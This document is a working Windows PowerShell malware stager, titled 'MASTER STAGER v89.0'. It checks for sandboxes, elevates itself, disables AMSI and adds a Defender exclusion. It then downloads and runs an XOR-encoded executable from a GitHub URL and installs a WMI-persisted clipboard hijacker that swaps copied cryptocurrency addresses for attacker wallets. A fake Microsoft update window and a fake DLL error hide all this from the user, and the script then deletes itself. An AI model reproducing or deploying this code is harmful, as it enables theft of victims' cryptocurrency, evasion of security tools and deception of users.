# --- [MASTER STAGER v89.0: ADDR-SPLIT + SYNC PROGRESS] ---
Add-Type -AssemblyName System.Windows.Forms, System.Drawing

# 1. GATEKEEPER (v65.0 Logic)
if ($((Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB) -lt 4) { exit } 

# 2. ADMIN GATE
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe -ArgumentList "-NoP -EP Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# 3. AMSI BYPASS
try {
    [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
} catch { }

# 4. ADDRESS SPLITTING (Bypasses Signature Scanners)
$b1 = "12nL9SBgpSmSdSyb"; $b2 = "q2bW2vKdoTggTnXVNA"
$e1 = "0x6c9ba9a6522b10135bb"; $e2 = "836fc9340477ba15f3392"
$u1 = "TVETSgvRui2LCmXyuvh"; $u2 = "8jHG6AjpxquFbnp"
$s1 = "BnBvKVEFRcxokGZv9s"; $s2 = "Awig8eQ4GvQY1frmZJWzU1bBNR"

$ClipperScript = "{
    `$w = @{'btc'='$b1$b2';'eth'='$e1$e2';'usdt'='$u1$u2';'sol'='$s1$s2'}
    Add-Type -As System.Windows.Forms
    while(`$true) {
        try {
            if([Windows.Forms.Clipboard]::ContainsText()){
                `$v = [Windows.Forms.Clipboard]::GetText().Trim()
                if(`$v -match '^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$'){ [Windows.Forms.Clipboard]::SetText(`$w.btc) }
                elseif(`$v -match '^0x[a-fA-F0-9]{40}$'){ [Windows.Forms.Clipboard]::SetText(`$w.eth) }
                elseif(`$v -match '^T[a-km-zA-HJ-NP-Z1-9]{33}$'){ [Windows.Forms.Clipboard]::SetText(`$w.usdt) }
                elseif(`$v -match '^[1-9A-HJ-NP-Za-km-z]{32,44}$'){ [Windows.Forms.Clipboard]::SetText(`$w.sol) }
            }
        } catch{}
        Start-Sleep -m 500
    }
}"

# 5. THE SYNCHRONIZED DEPLOYMENT FORM
$form = New-Object Windows.Forms.Form
$form.Text = "Microsoft Enterprise Update Service"; $form.Size = New-Object Drawing.Size(480,240); $form.StartPosition = "CenterScreen"; $form.TopMost = $true; $form.BackColor = [Drawing.Color]::White
$status = New-Object Windows.Forms.Label; $status.Location = New-Object Drawing.Point(30,40); $status.Size = New-Object Drawing.Size(400,30); $status.Text = "Initializing..."; $status.Font = New-Object Drawing.Font("Segoe UI", 10); $form.Controls.Add($status)
$pb = New-Object Windows.Forms.ProgressBar; $pb.Location = New-Object Drawing.Point(30,85); $pb.Size = New-Object Drawing.Size(400,15); $pb.Style = "Continuous"; $form.Controls.Add($pb); $form.Show()

# --- EXECUTION ENGINE ---
try {
    # Step A: Setup Directories (25%)
    $pb.Value = 25; $status.Text = "Configuring Security Environment..."; [Windows.Forms.Application]::DoEvents()
    $dir = "$env:PROGRAMDATA\Microsoft\Windows\Sync"
    if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force }
    Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue
    
    # Step B: Download & XOR adchar (50%)
    $pb.Value = 50; $status.Text = "Downloading System Components..."; [Windows.Forms.Application]::DoEvents()
    $path = Join-Path $dir "WinSvcHost.exe"
    $raw = (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/adchar_xor.txt")
    $data = [Convert]::FromBase64String($raw.Trim())
    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
    [IO.File]::WriteAllBytes($path, $data)
    Start-Process $path -WindowStyle Hidden
    
    # Step C: Install WMI Watchdog (75%)
    $pb.Value = 75; $status.Text = "Finalizing Secure Handshake..."; [Windows.Forms.Application]::DoEvents()
    $B64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ClipperScript))
    $Q = "SELECT * FROM __InstanceDeletionEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'powershell.exe'"
    $Cmd = "powershell.exe -NoP -W Hidden -EP Bypass -Enc $B64"
    Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{Name='MevFilter'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query=$Q} | Out-Null
    Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{Name='MevConsumer'; CommandLineTemplate=$Cmd} | Out-Null
    
    # Step D: Complete (100%)
    $pb.Value = 100; $status.Text = "Update Complete."; [Windows.Forms.Application]::DoEvents(); Start-Sleep -s 1
    $form.Close()

    # 6. FAKE DLL ERROR (The Final Trap)
    $msg = "The program can't start because msvcr120_clr0400.dll is missing from your computer. Try reinstalling the program to fix this problem."
    [Windows.Forms.MessageBox]::Show($msg, "System Error", 0, 16) | Out-Null

    # SELF-DESTRUCT
    Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue

} catch { $form.Close() }
